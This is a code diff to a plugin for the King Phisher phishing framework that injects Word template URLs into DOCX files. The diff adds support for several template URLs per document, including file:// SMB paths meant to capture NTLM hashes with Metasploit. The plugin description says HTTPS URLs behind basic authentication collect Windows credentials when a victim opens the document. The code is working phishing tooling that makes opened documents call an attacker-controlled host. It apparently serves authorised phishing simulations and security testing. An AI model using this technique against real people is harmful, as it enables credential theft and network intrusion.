@@ -1,14 +1,20 @@
 import argparse
+import distutils.version
 import os
 import random
+import urllib.parse
 import zipfile
 
 import king_phisher.archive as archive
 import king_phisher.client.plugins as plugins
+import king_phisher.version as version
 
 PARSER_EPILOG = """\
 If no output file is specified, the input file will be modified in place.
 """
+min_version = '1.9.0b5'
+StrictVersion = distutils.version.StrictVersion
+api_compatible = StrictVersion(version.distutils_version) >= StrictVersion(min_version)
 
 def path_is_doc_file(path):
 	if os.path.splitext(path)[1] not in ('.docx', '.docm'):
@@ -17,46 +23,81 @@ def path_is_doc_file(path):
 		return False
 	return True
 
-def phishery_inject(input_file, https_url, output_file=None):
+def phishery_inject(input_file, document_urls, output_file=None):
+	target_string = '<Relationship Id="{rid}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="{target_url}" TargetMode="External"/>'
 	input_file = os.path.abspath(input_file)
-	patches = {}
-	rid = 'rId' + str(random.randint(10000, 99999))
+	document_urls = document_urls.split()
+	rids = []
+	while len(rids) < len(document_urls):
+		rid = 'rId' + str(random.randint(10000, 99999))
+		if rid not in rids:
+			rids.append(rid)
+
 	settings = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\r\n'
 	settings += '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
-	settings += '<Relationship Id="{rid}" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="{target_url}" TargetMode="External"/>'
+	for rid, url in zip(rids, document_urls):
+		settings += target_string.format(rid=rid, target_url=url)
 	settings += '</Relationships>'
-	settings = settings.format(rid=rid, target_url=https_url)
+
+	patches = {}
 	patches['word/_rels/settings.xml.rels'] = settings
 	with zipfile.ZipFile(input_file, 'r') as zin:
 		settings = zin.read('word/settings.xml')
 	settings = settings.decode('utf-8')
-	settings = settings.replace('/><w', "/><w:attachedTemplate r:id=\"{0}\"/><w".format(rid), 1)
+	for rid in rids:
+		settings = settings.replace('/><w', "/><w:attachedTemplate r:id=\"{0}\"/><w".format(rid), 1)
 	patches['word/settings.xml'] = settings
 	archive.patch_zipfile(input_file, patches, output_file=output_file)
 
 class Plugin(getattr(plugins, 'ClientPluginMailerAttachment', plugins.ClientPlugin)):
-	authors = ['Ryan Hanson', 'Spencer McIntyre']
+	authors = ['Ryan Hanson', 'Spencer McIntyre', 'Erik Daguerre']
 	title = 'Phishery DOCX URL Injector'
 	description = """
-	Use Phishery to inject Word Document Template URLs into DOCX files. This can
-	be used in conjunction with a server page that requires Basic Authentication
-	to collect Windows credentials. Note that for HTTPS URLs, the King Phisher
-	server needs to be configured with a proper, trusted SSL certificate for
-	the user to be presented with the basic authentication prompt.
-
+	Inject Word Document Template URLs into DOCX files. The Phishery technique is
+	used to place multiple document template URLs into the word document (one per
+	line from the plugin settings).\n\n
+	* HTTP URL\n\n
+	The Jinja variable {{ url.webserver }} can be used for an HTTP URL to track when
+	documents are opened.\n
+	Note that to only track opened documents, DO NOT put a URL link into the
+	phishing email to the landing page. This will ensure that visits are only
+	registered for instance where the document is opened.\n\n
+	* HTTPS URL\n\n
+	The Jinja variable {{ url.webserver }} can be used for an HTTPS landing page
+	that requires basic authentication.\n
+	Note that for HTTPS URLs, the King Phisher server needs to be configured with a
+	proper, trusted SSL certificate for the user to be presented with the basic
+	authentication prompt.\n\n
+	* FILE URL\n\n
+	Utilizing the file://yourtargetserver/somepath URL format will capture SMB
+	credentials.\n
+	Note that King Phisher does not support SMB, and utilization of SMB requires
+	that a separate capture/sniffer application such as Metasploit's
+	auxiliary/server/capture/smb module will have to be used to capture NTLM hashes.
+	The plugin and King Phisher will only support injecting the URL path into the
+	document.\n\n
+	Original Project:\n
 	Phishery homepage: https://github.com/ryhanson/phishery
 	"""
 	homepage = 'https://github.com/securestate/king-phisher-plugins'
 	options = [
 		plugins.ClientOptionString(
 			'target_url',
-			'An optional target URL. The default is the phishing URL.',
+			'An optional target URLs. The default is the phishing URLs.',
 			default='{{ url.webserver }}',
-			display_name='Target URL'
+			display_name='Target URLs',
+			**({'multiline': True} if api_compatible else {})
+		),
+		plugins.ClientOptionBoolean(
+			'add_landing_pages',
+			'Add all document URLs as landing pages to track visits.',
+			default=True,
+			display_name='Add Landing Pages'
 		)
 	]
-	req_min_version = '1.9.0b5'
-	version = '2.0.1'
+	req_min_version = min_version
+	version = '2.1.0'
+
 	def initialize(self):
 		mailer_tab = self.application.main_tabs['mailer']
 		self.text_insert = mailer_tab.tabs['send_messages'].text_insert
@@ -91,6 +132,16 @@ class Plugin(getattr(plugins, 'ClientPluginMailerAttachment', plugins.ClientPlug
 		if target_url is None:
 			self.text_insert('The phishery target URL is invalid.\n')
 			return False
+
+		if not self.config['add_landing_pages']:
+			return True
+		document_urls = target_url.split()
+		for document_url in document_urls:
+			parsed_url = urllib.parse.urlparse(document_url)
+			hostname = parsed_url.netloc
+			landing_page = parsed_url.path
+			landing_page.lstrip('/')
+			self.application.rpc('campaign/landing_page/new', self.application.config['campaign_id'], hostname, landing_page)
 		return True
 
 def main():
